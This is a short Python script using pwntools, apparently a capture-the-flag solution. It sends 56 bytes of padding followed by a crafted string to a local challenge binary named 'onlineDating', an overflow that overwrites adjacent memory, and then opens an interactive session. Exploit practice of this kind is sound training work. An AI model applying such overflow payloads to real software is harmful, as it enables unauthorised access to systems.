from pwn import *

p = process('./onlineDating')
msgin = b'a'*56 + b'Gerard_PiqueClara_C.TwingoOoCasioOo!'
p.sendline(msgin)
p.interactive()
